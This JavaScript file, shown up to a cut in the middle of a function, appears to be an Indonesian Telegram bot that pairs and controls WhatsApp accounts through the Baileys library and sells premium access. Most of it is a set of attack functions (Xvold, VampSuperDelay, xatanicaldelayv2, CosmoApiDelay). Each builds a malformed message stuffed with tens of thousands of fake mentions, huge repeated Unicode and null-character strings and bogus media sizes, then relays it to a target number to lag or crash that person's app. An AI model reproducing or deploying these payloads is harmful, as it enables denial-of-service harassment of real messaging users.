const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  generateMessageID, 
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const { getTrazObfuscationConfig } = require("./FUNCTION/Function.js");

const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/SenxXtraz/Traz-Invictus/refs/heads/main/Token%2026.json";
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Please Wait... Checking Tokens 😁"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("🚫 𝚃𝙾𝙺𝙴𝙽 𝙱𝙴𝙻𝚄𝙼 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...."));
    process.exit(1);
  }

  console.log(chalk.green(` 𝚃𝙾𝙺𝙴𝙽 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁...⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(
    chalk.blue(`
━━━━━━━━━━━━━━━━
Succes Running a Bot... 
Informasi.. 
━━━━━━━━━━━━━━━━
信息 • Developer : Kipop Lecy
信息 • Security DB : On
信息 • Langue : Indonesian
信息 • Langue Doc : JavaScript
`)
  );
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝙿𝚁𝙾𝚂𝙴𝚂 𝙸𝙽𝙸𝚂𝙸𝙰𝚂𝙸... 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝙼𝙴𝙽𝙶𝙷𝚄𝙱𝚄𝙽𝙶𝙺𝙰𝙽 𝙺𝙴 𝙱𝙾𝚃... 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝙱𝙾𝚃 𝙶𝙰𝙶𝙰𝙻 𝚃𝙴𝚁𝙷𝚄𝙱𝚄𝙽𝙶.. 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝙱𝙾𝚃 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝚃𝙴𝚁𝙷𝚄𝙱𝚄𝙽𝙶.. 
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝐊𝐎𝐃𝐄: ${formattedCode}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`⭕ 
╭━━━━━━━「 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙸𝙾𝙽 | ━━━━━━━━━⬣
│ 𝐍𝐔𝐌𝐁𝐄𝐑𝐒: ${botNumber}
│ 𝐊𝐎𝐃𝐄: ${error.message}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium✅`;
  } else {
    return "No akses❌";
  }
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/qn2fud.jpg",
    "https://files.catbox.moe/kbt3hr.jpg",
    "https://files.catbox.moe/ebpcpt.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// #Progres #1
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
  if (!bot || !chatId || !message || !message.message_id) {
    console.error("updateProgress: Bot, chatId, atau message tidak valid");
    return;
  }

  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;

  try {
    await bot.editMessageText(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ${levelText} (${percentage}%)\n` +
        ` ${bar}\n` +
        "```\n" +
        "Kipop Encrypt Hard",
      {
        chat_id: chatId,
        message_id: message.message_id,
        parse_mode: "Markdown",
      }
    );
    await new Promise((resolve) =>
      setTimeout(resolve, Math.min(800, percentage * 8))
    );
  } catch (error) {
    console.error("Gagal memperbarui progres:", error.message);
  }
}

// Function... 
async function Xvold(target, mention) {
const Voldx = [
        {
            attrs: { biz_bot: '1' },
            tag: "meta",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));
 
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "AnosXVold",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(630) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
 const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
let buttonsMessage = {
            text: "᭯".repeat(9741),
            contentText: "\u0000",
            footerText: "\u0000",
            buttons: [
                {
                    buttonId: "\u0000".repeat(911000),
                    buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) },
                    type: 1,
                    headerType: 1,
                }, 
                {
                    text: "❦",
                    contentText:
                        "Untukmu 2000tahun yang akan datang",
                    footerText: "darimu 2000tahun yang lalu",
                    buttons: [
                        {
                            buttonId: ".anos",
                            buttonText: {
                                displayText: "Anos is maou" + "\u0000".repeat(500000),
                            },
                            type: 1,

}
                    ],
                    headerType: 1,
                },
                
           ]};
           
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Vold Delay",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🔴" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "Ciett Delayyyy"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};         


const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };  {};

const msg = generateWAMessageFromContent(target, message, delaymention, Voldx, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function VampSuperDelay(target, mention = false) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Vampire Crash" + "ោ៝".repeat(10000),
        title: "Iqbhalkeifer",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "V A M P I R E  H E R E ! ! !",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "VampClouds"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function xatanicaldelayv2(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function CosmoApiDelay(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RyuuX🫀",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };
  

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Hades Here Bro" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function ExTraKouta(target) {
  let message = {
    viewOnceMessage: {
